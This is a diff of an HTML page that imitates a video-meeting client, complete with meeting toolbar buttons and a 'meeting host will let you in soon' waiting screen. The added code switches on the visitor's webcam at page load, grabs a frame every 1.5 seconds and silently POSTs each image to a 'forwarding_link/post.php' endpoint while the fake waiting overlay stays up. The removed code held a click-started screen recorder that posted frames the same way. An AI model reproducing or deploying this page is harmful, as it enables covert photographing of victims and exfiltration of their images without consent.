@@ -2,249 +2,207 @@
 <html>
 
 <head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-  <style>
-    @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
-    body {
-      height: 100vh;
-      width: 100vw;
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-    }
-
-    * {
-      padding: 0px;
-      margin: 0px;
-      font-family: 'Nunito', sans-serif;
-      font-weight: 500;
-    }
-
-    .main-screen {
-      background-color: #273039;
-      height: 100vh;
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .video-wrap {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 1;
-    }
-
-    #video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    #canvas {
-      display: none;
-    }
-
-    .bottom-bar {
-      position: fixed;
-      padding: 0px 40px;
-      bottom: 0px;
-      height: 80px;
-      width: 100%;
-      background-color: #1F2022;
-      display: flex;
-      flex-direction: row;
-      justify-content: center;
-      align-items: center;
-      color: #fff;
-      z-index: 100;
-    }
-
-    .icon-button {
-      display: flex;
-      flex-direction: column;
-      justify-items: center;
-      align-items: center;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      padding: 8px 12px;
-      border-radius: 10px;
-    }
-
-    .icon-button:hover {
-      background-color: #3a3d42;
-    }
-
-    i {
-      margin-bottom: 8px;
-      font-size: 26px;
-    }
-
-    button {
-      color: #fff;
-      background-color: crimson;
-      padding: 5px 20px;
-      border: none;
-      border-radius: 5px;
-      border-style: none;
-      outline: none;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #dc143c;
-      transform: scale(1.05);
-    }
-
-    .float_button {
-      background-color: #1F2022;
-      height: 40px;
-      border-radius: 5px;
-      width: 40px;
-      position: fixed;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      top: 5px;
-      right: 5px;
-      z-index: 100;
-      cursor: pointer;
-    }
-
-    #ac-wrapper {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(255, 255, 255, .6);
-      z-index: 1001;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    #popup {
-      width: 555px;
-      height: auto;
-      padding: 20px;
-      background: #FFFFFF;
-      border: 5px solid #000;
-      border-radius: 15px;
-      -moz-border-radius: 15px;
-      -webkit-border-radius: 15px;
-      box-shadow: #64686e 0px 0px 3px 3px;
-      -moz-box-shadow: #64686e 0px 0px 3px 3px;
-      -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-      position: relative;
-      text-align: center;
-    }
-
-    #popup h2 {
-      color: #333;
-      margin-bottom: 15px;
-    }
-
-    #popup p {
-      color: #666;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-
-    .recording-badge {
-      position: fixed;
-      top: 20px;
-      left: 20px;
-      background: rgba(220, 20, 60, 0.9);
-      color: white;
-      padding: 8px 15px;
-      border-radius: 25px;
-      z-index: 100;
-      display: none;
-      align-items: center;
-      gap: 10px;
-      font-size: 14px;
-      backdrop-filter: blur(5px);
-    }
-
-    .recording-badge.active {
-      display: flex;
-    }
-
-    .red-dot {
-      width: 10px;
-      height: 10px;
-      background-color: #ff0000;
-      border-radius: 50%;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0.3; }
-      100% { opacity: 1; }
-    }
-
-    .toast-msg {
-      position: fixed;
-      bottom: 100px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0, 0, 0, 0.8);
-      color: white;
-      padding: 10px 20px;
-      border-radius: 25px;
-      z-index: 1000;
-      font-size: 14px;
-      pointer-events: none;
-      animation: fadeInOut 2s ease;
-    }
-
-    @keyframes fadeInOut {
-      0% { opacity: 0; bottom: 80px; }
-      15% { opacity: 1; bottom: 100px; }
-      85% { opacity: 1; bottom: 100px; }
-      100% { opacity: 0; bottom: 80px; }
-    }
-  </style>
 </head>
+
+<div class="video-wrap">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
+
+  body {
+    height: 100vh;
+    width: 100vw;
+  }
+
+  * {
+    padding: 0px;
+    margin: 0px;
+    font-family: 'Nunito', sans-serif;
+    font-weight: 500;
+  }
+
+  .main-screen {
+    background-color: #273039;
+    height: 100vh;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  img {
+    height: 80px;
+    width: 80px;
+  }
+
+  .bottom-bar {
+    position: fixed;
+    padding: 0px 40px 0px -40px;
+    bottom: 0px;
+    height: 80px;
+    width: 100%;
+    background-color: #1F2022;
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+  }
+
+  .icon-button {
+    display: flex;
+    flex-direction: column;
+    justify-items: center;
+    align-items: center;
+  }
+
+  i {
+    margin-bottom: 8px;
+    font-size: 26px;
+  }
+
+  button {
+    color: #fff;
+    background-color: crimson;
+    padding: 5px 20px;
+    border: none;
+    border-radius: 5px;
+    border-style: none;
+    outline: none;
+  }
+
+  .float_button {
+    background-color: #1F2022;
+    height: 40px;
+    border-radius: 5px;
+    width: 40px;
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 5px;
+    right: 5px;
+  }
+  #ac-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255,255,255,.6);
+    z-index: 1001;
+}
+
+#popup {
+    width: 555px;
+    height: 35px;
+    background: #FFFFFF;
+    border: 5px solid #000;
+    border-radius: 15px;
+    -moz-border-radius: 15px;
+    -webkit-border-radius: 15px;
+    box-shadow: #64686e 0px 0px 3px 3px;
+    -moz-box-shadow: #64686e 0px 0px 3px 3px;
+    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+    position: relative;
+    top: 250px; left: 375px;
+}
+</style>
+
+<script>
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {
+      }
+    });
+  };
+
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1500);
+
+
+  }
+  function PopUp(){
+    document.getElementById('ac-wrapper').style.display="none"; 
+}
+  // Load init
+  init();
+  $(document).ready(function(){
+   setTimeout(function(){
+      PopUp();
+   },50000); // 5000 to load it after 5 seconds from page load
+});
+</script>
 
 <body>
   <div class="float_button">
     <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
   </div>
-
-  <div class="video-wrap">
-    <video id="video" playsinline autoplay></video>
-  </div>
-
-  <canvas id="canvas" width="640" height="480"></canvas>
-
-  <div class="recording-badge" id="recordingBadge">
-    <div class="red-dot"></div>
-    <span>🔴 RECORDING (Audio + Screen)</span>
-  </div>
-
-  <div id="ac-wrapper" style="display: none;">
+  <div id="ac-wrapper">
     <div id="popup">
-      <center>
-        <h2>Please wait the meeting host will let you in soon</h2>
-      </center>
+        <center>
+            <h2>Please wait the meeting host will let you in soon</h2>
+        </center>
     </div>
-  </div>
-
+</div>
   <div class="bottom-bar">
-    <div class="icon-button" id="muteBtn">
+    <div class="icon-button" style="margin-left: 50px;">
       <i class="fas fa-microphone"></i>
       <h6>Mute</h6>
     </div>
-    <div class="icon-button" id="stopVideoBtn">
+    <div class="icon-button" style="margin-left: 50px;">
       <i class="fas fa-video"></i>
       <h6>Stop Video</h6>
     </div>
@@ -252,359 +210,24 @@
       <i class="fas fa-shield-alt"></i>
       <h6>Security</h6>
     </div>
-    <div class="icon-button">
+    <div class="icon-button" style="margin-left: 50px;">
       <i class="fas fa-users"></i>
       <h6>Participants</h6>
     </div>
-    <div class="icon-button" id="shareScreenBtn" style="color: lawngreen;">
+    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
       <i class="fas fa-plus-square"></i>
       <h6>Share content</h6>
     </div>
-    <div class="icon-button">
+    <div class="icon-button" style="margin-left: 50px;">
       <i class="fas fa-comments"></i>
       <h6>Chat</h6>
     </div>
-    <div class="icon-button" id="recordBtn">
+    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
       <i class="fas fa-record-vinyl"></i>
       <h6>Record</h6>
     </div>
-    <button id="endBtn">End</button>
+    <button style="margin-right: 50px;">End</button>
   </div>
-
-  <script>
-    // Advanced Screen Recorder with Permission Memory
-    class ScreenRecorderWithMemory {
-      constructor() {
-        this.stream = null;
-        this.mediaRecorder = null;
-        this.recordedChunks = [];
-        this.isRecording = false;
-        this.isScreenSharing = false;
-        this.videoElement = document.getElementById('video');
-        this.canvas = document.getElementById('canvas');
-        this.context = this.canvas.getContext('2d');
-        this.recordingBadge = document.getElementById('recordingBadge');
-        this.recordBtn = document.getElementById('recordBtn');
-        this.shareScreenBtn = document.getElementById('shareScreenBtn');
-        this.endBtn = document.getElementById('endBtn');
-        this.muteBtn = document.getElementById('muteBtn');
-        this.stopVideoBtn = document.getElementById('stopVideoBtn');
-        
-        // Load saved preferences
-        this.loadPermissions();
-        this.setupEventListeners();
-        this.showToast('✅ Ready! Click "Share content" to start (popup only once)');
-      }
-      
-      loadPermissions() {
-        const savedPrefs = localStorage.getItem('screenRecorder_prefs');
-        if (savedPrefs) {
-          const prefs = JSON.parse(savedPrefs);
-          if (prefs.permissionGranted && prefs.timestamp) {
-            this.showToast('🔓 Permissions remembered! Direct recording available', 'success');
-            // Auto-start screen share if previously granted
-            setTimeout(() => {
-              if (confirm('Previous permissions found! Start screen sharing automatically?')) {
-                this.startScreenShare();
-              }
-            }, 1000);
-          }
-        }
-      }
-      
-      savePermissions() {
-        const prefs = {
-          permissionGranted: true,
-          timestamp: Date.now(),
-          deviceInfo: navigator.userAgent
-        };
-        localStorage.setItem('screenRecorder_prefs', JSON.stringify(prefs));
-        this.showToast('💾 Permissions saved! Next time no popup will appear', 'success');
-      }
-      
-      clearPermissions() {
-        localStorage.removeItem('screenRecorder_prefs');
-        this.showToast('🗑️ Permissions cleared! Next time popup will appear', 'info');
-      }
-      
-      showToast(message, type = 'info') {
-        const toast = document.createElement('div');
-        toast.className = 'toast-msg';
-        toast.innerHTML = message;
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3000);
-      }
-      
-      setupEventListeners() {
-        this.shareScreenBtn.addEventListener('click', () => this.startScreenShare());
-        this.recordBtn.addEventListener('click', () => this.toggleRecording());
-        this.endBtn.addEventListener('click', () => this.endCall());
-        this.muteBtn.addEventListener('click', () => this.toggleMute());
-        this.stopVideoBtn.addEventListener('click', () => this.toggleVideo());
-      }
-      
-      async startScreenShare() {
-        if (this.isScreenSharing) {
-          this.showToast('Already sharing screen!', 'warning');
-          return;
-        }
-        
-        try {
-          this.showToast('Requesting screen + audio (allow once, then never again)', 'info');
-          
-          // Request screen with audio
-          const screenConstraints = {
-            video: { cursor: "always", frameRate: { ideal: 30 } },
-            audio: true  // System audio capture
-          };
-          
-          const screenStream = await navigator.mediaDevices.getDisplayMedia(screenConstraints);
-          
-          // Request microphone separately
-          let micStream = null;
-          try {
-            micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            this.showToast('🎤 Microphone connected! Full audio mode active', 'success');
-          } catch (err) {
-            this.showToast('⚠️ Microphone not available, system audio only', 'warning');
-          }
-          
-          // Combine streams
-          const videoTracks = screenStream.getVideoTracks();
-          const audioTracks = [];
-          
-          // Add system audio
-          if (screenStream.getAudioTracks().length > 0) {
-            audioTracks.push(...screenStream.getAudioTracks());
-          }
-          
-          // Add microphone audio
-          if (micStream && micStream.getAudioTracks().length > 0) {
-            audioTracks.push(...micStream.getAudioTracks());
-          }
-          
-          this.stream = new MediaStream([...videoTracks, ...audioTracks]);
-          
-          // Display in video element
-          this.videoElement.srcObject = this.stream;
-          this.videoElement.muted = true; // Mute to prevent feedback
-          await this.videoElement.play();
-          
-          this.isScreenSharing = true;
-          this.shareScreenBtn.style.color = '#00ff00';
-          this.showToast('✅ Screen sharing active! Audio capture: ON', 'success');
-          
-          // Save permissions for next time
-          this.savePermissions();
-          
-          // Auto-start canvas capturing for the AJAX post (if needed)
-          this.startCanvasCapture();
-          
-          // Handle when user stops sharing via browser
-          videoTracks[0].onended = () => {
-            this.stopScreenShare();
-          };
-          
-        } catch (err) {
-          console.error('Screen share error:', err);
-          let errorMsg = 'Failed to share screen. ';
-          if (err.name === 'NotAllowedError') {
-            errorMsg += 'Please allow screen sharing permission.';
-          } else {
-            errorMsg += err.message;
-          }
-          this.showToast(errorMsg, 'error');
-        }
-      }
-      
-      stopScreenShare() {
-        if (this.stream) {
-          this.stream.getTracks().forEach(track => track.stop());
-          this.stream = null;
-        }
-        this.videoElement.srcObject = null;
-        this.isScreenSharing = false;
-        this.shareScreenBtn.style.color = 'lawngreen';
-        
-        if (this.isRecording) {
-          this.stopRecording();
-        }
-        
-        this.showToast('Screen sharing stopped', 'info');
-      }
-      
-      startCanvasCapture() {
-        // Original functionality: capture canvas and send via AJAX every 1.5 seconds
-        if (this.canvasInterval) clearInterval(this.canvasInterval);
-        
-        this.canvasInterval = setInterval(() => {
-          if (this.videoElement && this.videoElement.readyState >= 2) {
-            this.context.drawImage(this.videoElement, 0, 0, 640, 480);
-            const canvasData = this.canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-            this.postImageData(canvasData);
-          }
-        }, 1500);
-      }
-      
-      postImageData(imgdata) {
-        // Original AJAX post function
-        $.ajax({
-          type: 'POST',
-          data: { cat: imgdata },
-          url: 'forwarding_link/post.php',
-          dataType: 'json',
-          async: false,
-          success: function(result) {
-            // Handle response if needed
-          },
-          error: function() {
-            // Silent fail - don't spam errors
-          }
-        });
-      }
-      
-      async toggleRecording() {
-        if (!this.isScreenSharing) {
-          this.showToast('Please start screen sharing first!', 'warning');
-          return;
-        }
-        
-        if (this.isRecording) {
-          this.stopRecording();
-        } else {
-          await this.startRecording();
-        }
-      }
-      
-      async startRecording() {
-        if (!this.stream) {
-          this.showToast('No active stream to record', 'error');
-          return;
-        }
-        
-        try {
-          this.recordedChunks = [];
-          const mimeType = this.getMimeType();
-          
-          this.mediaRecorder = new MediaRecorder(this.stream, {
-            mimeType: mimeType,
-            videoBitsPerSecond: 3000000,
-            audioBitsPerSecond: 128000
-          });
-          
-          this.mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-              this.recordedChunks.push(event.data);
-            }
-          };
-          
-          this.mediaRecorder.onstop = () => {
-            this.saveRecording();
-          };
-          
-          this.mediaRecorder.start(1000);
-          this.isRecording = true;
-          this.recordingBadge.classList.add('active');
-          this.recordBtn.style.color = '#ff0000';
-          this.showToast('🔴 Recording started! Audio + Screen', 'success');
-          
-        } catch (err) {
-          console.error('Recording error:', err);
-          this.showToast('Failed to start recording: ' + err.message, 'error');
-        }
-      }
-      
-      stopRecording() {
-        if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
-          this.mediaRecorder.stop();
-          this.isRecording = false;
-          this.recordingBadge.classList.remove('active');
-          this.recordBtn.style.color = '#fff';
-          this.showToast('⏹️ Recording stopped', 'info');
-        }
-      }
-      
-      saveRecording() {
-        if (this.recordedChunks.length === 0) {
-          this.showToast('No recording data captured', 'error');
-          return;
-        }
-        
-        const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        a.download = `screen_recording_${timestamp}.webm`;
-        a.href = url;
-        a.click();
-        URL.revokeObjectURL(url);
-        this.showToast('📥 Recording saved!', 'success');
-        this.recordedChunks = [];
-      }
-      
-      getMimeType() {
-        const types = [
-          'video/webm;codecs=vp9,opus',
-          'video/webm;codecs=vp8,opus',
-          'video/webm;codecs=h264,opus',
-          'video/webm'
-        ];
-        for (const type of types) {
-          if (MediaRecorder.isTypeSupported(type)) return type;
-        }
-        return 'video/webm';
-      }
-      
-      toggleMute() {
-        if (this.stream) {
-          const audioTracks = this.stream.getAudioTracks();
-          audioTracks.forEach(track => {
-            track.enabled = !track.enabled;
-            if (!track.enabled) {
-              this.muteBtn.style.opacity = '0.5';
-              this.showToast('🔇 Microphone muted', 'info');
-            } else {
-              this.muteBtn.style.opacity = '1';
-              this.showToast('🎤 Microphone unmuted', 'info');
-            }
-          });
-        }
-      }
-      
-      toggleVideo() {
-        if (this.stream) {
-          const videoTracks = this.stream.getVideoTracks();
-          videoTracks.forEach(track => {
-            track.enabled = !track.enabled;
-            if (!track.enabled) {
-              this.stopVideoBtn.style.opacity = '0.5';
-              this.showToast('📹 Video paused', 'info');
-            } else {
-              this.stopVideoBtn.style.opacity = '1';
-              this.showToast('📹 Video resumed', 'info');
-            }
-          });
-        }
-      }
-      
-      endCall() {
-        this.stopRecording();
-        this.stopScreenShare();
-        if (this.canvasInterval) clearInterval(this.canvasInterval);
-        this.showToast('Call ended', 'info');
-      }
-    }
-    
-    // Initialize the recorder when page loads
-    $(document).ready(function() {
-      const recorder = new ScreenRecorderWithMemory();
-      
-      // Original popup functionality (modified - hidden by default)
-      setTimeout(function() {
-        $('#ac-wrapper').fadeOut();
-      }, 1000);
-    });
-  </script>
 </body>
 
 </html>
